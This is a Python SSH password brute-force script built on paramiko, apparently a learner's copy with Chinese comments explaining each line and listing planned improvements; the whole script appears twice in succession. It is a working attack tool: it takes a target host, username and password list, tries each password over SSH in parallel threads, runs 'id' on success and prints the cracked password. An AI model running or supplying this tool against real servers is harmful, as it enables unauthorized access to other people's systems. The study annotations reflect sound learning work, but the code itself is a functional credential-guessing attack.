"""
需要优化：
optparse库替换为argparse库
最大连接数，端口号，超时时间，执行的命令不可传入不够灵活

"""

import paramiko  # openssh库

# 3.2 版后已移除: optparse 模块已被弃用并且将不再继续开发；开发将转至 argparse 模块进行。
import optparse  # 参数库
import time  # 时间库
import threading  # 多线程库

# 定义int变量最大连接数 5
max_connections = 5

# 调用threading库中的BoundedSemaphore设置一个信号锁，实现线程锁定
connection_lock = threading.BoundedSemaphore(value=max_connections)
# 定义一个布尔变量名 作用是占位？
found = False

# 定义一个int变量 作用是占位？
fails = 0


# 创建函数connect，四个参数
def connect(host, user, password, release):  # 代码存在一些问题需要优化
    # 全局变量不可在函数内修改，需要global关键字才能修改，这里表示found和fails在函数内部已经是处于可修改了
    global found, fails
    try:
        # ssh客户端方法传递给ssh
        ssh = paramiko.SSHClient()
        # ssh握手自动通过指纹询问
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 发起ssh连接，指定了端口22；这里存在端口硬编码缺陷
        ssh.connect(host, 22, user, password, timeout=5)
        # ssh连接执行的命令传递给 标准输入标准输出标准错误，也就是实现回显功能；这里存在缺陷2 硬编码了命令
        stdin, stdout, stderr = ssh.exec_command('id')  # 分析三个std变量是什么
        # 打印传递的密码正确
        print("[+] Password Found: {}".format(password))
        # 不知何用，和12行一致
        found = True
        # 关闭ssh连接
        ssh.close()
    except Exception as e:
        # 如果发生阻塞，至于是什么阻塞不知道，写阻塞？
        if "read_nonblocking" in str(e):
            # 把fails的值+1并且更新fails变量
            fails += 1
            # 线程睡眠5秒
            time.sleep(5)
            # 重新发起连接，并且把release设置为False
            connect(host, user, password, False)
        # 满足上面if后再判断sync...字符串是否在异常中
        elif "synchronize with original prompt" in str(e):
            # 睡眠1秒
            time.sleep(1)
            # 再次连接
            connect(host, user, password, False)
    finally:
        # 如论如何都执行如果release为True
        if release:
            # 执行release函数释放线程
            connection_lock.release()


# 定义入口函数main
def main():  # 入口有一些问题需要优化。
    # 调用参数库定义help信息
    parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -F <password list>")
    parser.add_option("-H", dest="target_host", type=str, help="specifiy target host")
    parser.add_option("-F", dest="password_file", type=str, help="specifiy password file")
    parser.add_option("-u", dest="user", type=str, help="specifiy the user")

    # parse_args()将返回两个值，分别传递给options和args
    options, args = parser.parse_args()
    # 把传入主机值传递给target_host
    target_host = options.target_host
    # 把传入密码文件值传递给pass
    password_file = options.password_file
    # 把传入用户名传递给user
    user = options.user

    # 如果主机，用户，密码是空值
    if target_host is None or password_file is None or user is None:
        # 打印机banner
        print(parser.usage)
        # 退出并告诉解释器执行出现了异常
        exit(-1)

    # 只读方式打开密码文件传递给f
    with open(password_file, "r") as f:
        # 进入for循环逐行读取传递给line
        for line in f.readlines():
            # 如果found为真，这个变量在27行控制
            if found:
                # 输出
                print("[*] Exiing: Password Found")
                # 退出
                exit(0)
            # 如果fails大于5，这个变量在30行控制
            if fails > 5:
                # 输出
                print("[!] Exiting: Too Many Socket Timeouts")
                # 退出报告异常
                exit(-1)

            connection_lock.acquire()
            # 每行数据去掉回车符号传递给password
            password = line.strip("\r\n")
            # 打印正在测试哪个密码
            print("[-] Testing: {}".format(password))
            # 传入线程所有参数
            t = threading.Thread(target=connect, args=(target_host, user, password, True))
            # 循环内执行这个线程
            child = t.start()


if __name__ == "__main__":
    main()
"""
需要优化：
optparse库替换为argparse库
最大连接数，端口号，超时时间，执行的命令不可传入不够灵活

"""

import paramiko  # openssh库

# 3.2 版后已移除: optparse 模块已被弃用并且将不再继续开发；开发将转至 argparse 模块进行。
import optparse  # 参数库
import time  # 时间库
import threading  # 多线程库

# 定义int变量最大连接数 5
max_connections = 5

# 调用threading库中的BoundedSemaphore设置一个信号锁，实现线程锁定
connection_lock = threading.BoundedSemaphore(value=max_connections)
# 定义一个布尔变量名 作用是占位？
found = False

# 定义一个int变量 作用是占位？
fails = 0


# 创建函数connect，四个参数
def connect(host, user, password, release):  # 代码存在一些问题需要优化
    # 全局变量不可在函数内修改，需要global关键字才能修改，这里表示found和fails在函数内部已经是处于可修改了
    global found, fails
    try:
        # ssh客户端方法传递给ssh
        ssh = paramiko.SSHClient()
        # ssh握手自动通过指纹询问
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 发起ssh连接，指定了端口22；这里存在端口硬编码缺陷
        ssh.connect(host, 22, user, password, timeout=5)
        # ssh连接执行的命令传递给 标准输入标准输出标准错误，也就是实现回显功能；这里存在缺陷2 硬编码了命令
        stdin, stdout, stderr = ssh.exec_command('id')  # 分析三个std变量是什么
        # 打印传递的密码正确
        print("[+] Password Found: {}".format(password))
        # 不知何用，和12行一致
        found = True
        # 关闭ssh连接
        ssh.close()
    except Exception as e:
        # 如果发生阻塞，至于是什么阻塞不知道，写阻塞？
        if "read_nonblocking" in str(e):
            # 把fails的值+1并且更新fails变量
            fails += 1
            # 线程睡眠5秒
            time.sleep(5)
            # 重新发起连接，并且把release设置为False
            connect(host, user, password, False)
        # 满足上面if后再判断sync...字符串是否在异常中
        elif "synchronize with original prompt" in str(e):
            # 睡眠1秒
            time.sleep(1)
            # 再次连接
            connect(host, user, password, False)
    finally:
        # 如论如何都执行如果release为True
        if release:
            # 执行release函数释放线程
            connection_lock.release()


# 定义入口函数main
def main():  # 入口有一些问题需要优化。
    # 调用参数库定义help信息
    parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -F <password list>")
    parser.add_option("-H", dest="target_host", type=str, help="specifiy target host")
    parser.add_option("-F", dest="password_file", type=str, help="specifiy password file")
    parser.add_option("-u", dest="user", type=str, help="specifiy the user")

    # parse_args()将返回两个值，分别传递给options和args
    options, args = parser.parse_args()
    # 把传入主机值传递给target_host
    target_host = options.target_host
    # 把传入密码文件值传递给pass
    password_file = options.password_file
    # 把传入用户名传递给user
    user = options.user

    # 如果主机，用户，密码是空值
    if target_host is None or password_file is None or user is None:
        # 打印机banner
        print(parser.usage)
        # 退出并告诉解释器执行出现了异常
        exit(-1)

    # 只读方式打开密码文件传递给f
    with open(password_file, "r") as f:
        # 进入for循环逐行读取传递给line
        for line in f.readlines():
            # 如果found为真，这个变量在27行控制
            if found:
                # 输出
                print("[*] Exiing: Password Found")
                # 退出
                exit(0)
            # 如果fails大于5，这个变量在30行控制
            if fails > 5:
                # 输出
                print("[!] Exiting: Too Many Socket Timeouts")
                # 退出报告异常
                exit(-1)

            connection_lock.acquire()
            # 每行数据去掉回车符号传递给password
            password = line.strip("\r\n")
            # 打印正在测试哪个密码
            print("[-] Testing: {}".format(password))
            # 传入线程所有参数
            t = threading.Thread(target=connect, args=(target_host, user, password, True))
            # 循环内执行这个线程
            child = t.start()


if __name__ == "__main__":
    main()
